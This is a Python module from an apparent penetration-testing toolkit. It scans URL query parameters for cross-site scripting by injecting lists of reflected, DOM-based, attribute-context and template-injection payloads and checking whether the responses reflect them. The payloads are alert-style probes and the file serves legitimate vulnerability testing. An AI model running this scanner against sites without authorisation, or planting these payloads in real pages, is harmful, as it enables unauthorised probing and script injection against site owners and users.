"""Cross-Site Scripting (XSS) vulnerability scanner.

Tests URL parameters for reflected, DOM-based, and attribute-context XSS
by injecting payloads and checking for reflection in the response body.
"""

import asyncio
import re
from typing import Any
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

import aiohttp

from src.core.base_module import (
    AtsModule,
    ModuleSpec,
    ModuleCategory,
    Parameter,
    ParameterType,
    OutputField,
)

REFLECTED_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<iframe src=javascript:alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<math><mtext><table><mglyph><svg><mtext><textarea><path id=x>",
]

DOM_PAYLOADS = [
    "javascript:alert('XSS')",
    "data:text/html,<script>alert('XSS')</script>",
    "#<script>alert('XSS')</script>",
    "'-alert('XSS')-'",
    "\";alert('XSS');//",
    "{{constructor.constructor('alert(1)')()}}",
    "${alert('XSS')}",
    "{{7*7}}",
]

ATTRIBUTE_PAYLOADS = [
    "\" onmouseover=\"alert('XSS')\"",
    "' onmouseover='alert(1)'",
    "\" onfocus=\"alert('XSS')\" autofocus=\"",
    "' style='background:url(javascript:alert(1))'",
    "\" onload=\"alert('XSS')\"",
    "' onclick='alert(1)' x='",
    "\"><img src=x onerror=alert('XSS')>",
    "'/><script>alert('XSS')</script>",
]

ENCODED_TRANSFORMS: list[tuple[str, str]] = [
    ("<", "&lt;"), (">", "&gt;"), ("\"", "&quot;"), ("'", "&#x27;"),
]


class XssScannerModule(AtsModule):
    """Scan URL parameters for Cross-Site Scripting vulnerabilities."""

    def get_spec(self) -> ModuleSpec:
        return ModuleSpec(
            name="xss_scanner",
            category=ModuleCategory.PENTEST,
            description="Test URL parameters for reflected, DOM-based, and attribute-context XSS vulnerabilities",
            version="1.0.0",
            parameters=[
                Parameter(name="url", type=ParameterType.URL,
                          description="Target URL with query parameters to test", required=True),
                Parameter(name="payload_type", type=ParameterType.CHOICE,
                          description="Type of XSS payloads to inject",
                          choices=["all", "reflected", "dom", "attribute"], default="all"),
                Parameter(name="encode", type=ParameterType.BOOLEAN,
                          description="Also test URL-encoded variants of payloads",
                          default=False),
            ],
            outputs=[
                OutputField(name="vulnerabilities", type="list", description="Detected XSS vulnerabilities with evidence"),
                OutputField(name="summary", type="dict", description="Scan summary and statistics"),
            ],
            tags=["pentest", "xss", "web", "injection", "cross-site-scripting"],
            author="ATS-Toolkit",
            dangerous=True,
        )

    def validate_inputs(self, config: dict[str, Any]) -> tuple[bool, str]:
        url = config.get("url", "").strip()
        if not url:
            return False, "URL is required"
        if not url.startswith(("http://", "https://")):
            return False, "URL must start with http:// or https://"
        return True, ""

    def _extract_params(self, url: str) -> list[str]:
        """Extract query parameter names from URL."""
        parsed = urlparse(url)
        return list(parse_qs(parsed.query).keys())

    def _build_injected_url(self, url: str, param: str, payload: str) -> str:
        """Replace a query parameter value with the XSS payload."""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _get_payloads(self, payload_type: str, encode: bool) -> list[tuple[str, str]]:
        """Build list of (payload, category) tuples based on configuration."""
        payloads: list[tuple[str, str]] = []
        if payload_type in ("all", "reflected"):
            payloads.extend([(p, "reflected") for p in REFLECTED_PAYLOADS])
        if payload_type in ("all", "dom"):
            payloads.extend([(p, "dom") for p in DOM_PAYLOADS])
        if payload_type in ("all", "attribute"):
            payloads.extend([(p, "attribute") for p in ATTRIBUTE_PAYLOADS])

        if encode:
            encoded_extras = []
            for payload, category in payloads:
                encoded = payload
                for char, entity in ENCODED_TRANSFORMS:
                    encoded = encoded.replace(char, entity)
                if encoded != payload:
                    encoded_extras.append((encoded, f"{category}_encoded"))
            payloads.extend(encoded_extras)
        return payloads

    def _check_reflection(self, body: str, payload: str, category: str) -> dict[str, Any] | None:
        """Check if the payload is reflected in the response body."""
        if payload in body:
            context = self._identify_context(body, payload)
            return {
                "reflected": True,
                "context": context,
                "encoded": False,
            }
        # Check for partial reflection (tag characters)
        key_parts = re.findall(r'<[^>]*>', payload)
        for part in key_parts:
            if part in body:
                return {
                    "reflected": True,
                    "context": "partial",
                    "matched_part": part,
                    "encoded": False,
                }
        return None

    def _identify_context(self, body: str, payload: str) -> str:
        """Determine the HTML context where the payload was reflected."""
        idx = body.find(payload)
        if idx == -1:
            return "unknown"
        before = body[max(0, idx - 100):idx]
        if re.search(r'<script[^>]*>(?:(?!</script>).)*$', before, re.DOTALL | re.IGNORECASE):
            return "script"
        if re.search(r'<[a-zA-Z][^>]*\s\w+=\s*["\']?[^"\']*$', before):
            return "attribute"
        if re.search(r'<!--(?:(?!-->).)*$', before, re.DOTALL):
            return "comment"
        return "html_body"

    async def _test_param(self, session: aiohttp.ClientSession, url: str, param: str,
                           payloads: list[tuple[str, str]]) -> list[dict[str, Any]]:
        """Test a single parameter with all payloads."""
        vulnerabilities = []
        for payload, category in payloads:
            injected_url = self._build_injected_url(url, param, payload)
            try:
                async with session.get(injected_url, timeout=aiohttp.ClientTimeout(total=10),
                                       ssl=False, allow_redirects=True) as resp:
                    body = await resp.text(errors="replace")
                    reflection = self._check_reflection(body, payload, category)
                    if reflection:
                        severity = "high"
                        if reflection["context"] == "partial":
                            severity = "medium"
                        elif category.endswith("_encoded"):
                            severity = "low"

                        vulnerabilities.append({
                            "type": category,
                            "parameter": param,
                            "payload": payload,
                            "reflection": reflection,
                            "status_code": resp.status,
                            "severity": severity,
                            "url": injected_url[:500],
                        })
            except (aiohttp.ClientError, asyncio.TimeoutError):
                continue
        return vulnerabilities

    async def execute(self, config: dict[str, Any]) -> dict[str, Any]:
        url = config["url"].strip()
        payload_type = config.get("payload_type", "all")
        encode = config.get("encode", False)

        params = self._extract_params(url)
        if not params:
            return {
                "vulnerabilities": [],
                "summary": {"error": "No query parameters found in URL", "url": url,
                            "total_tests": 0, "vulnerabilities_found": 0},
            }

        payloads = self._get_payloads(payload_type, encode)
        all_vulns: list[dict[str, Any]] = []
        connector = aiohttp.TCPConnector(limit=10, ssl=False)

        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for param in params:
                tasks.append(self._test_param(session, url, param, payloads))
            results = await asyncio.gather(*tasks)
            for result in results:
                all_vulns.extend(result)

        summary = {
            "url": url,
            "parameters_tested": params,
            "payload_type": payload_type,
            "total_payloads": len(payloads),
            "total_tests": len(payloads) * len(params),
            "vulnerabilities_found": len(all_vulns),
            "severity_breakdown": {
                "high": sum(1 for v in all_vulns if v.get("severity") == "high"),
                "medium": sum(1 for v in all_vulns if v.get("severity") == "medium"),
                "low": sum(1 for v in all_vulns if v.get("severity") == "low"),
            },
        }

        self.logger.info("xss_scan_complete", vulns=len(all_vulns), tests=summary["total_tests"])
        return {"vulnerabilities": all_vulns, "summary": summary}
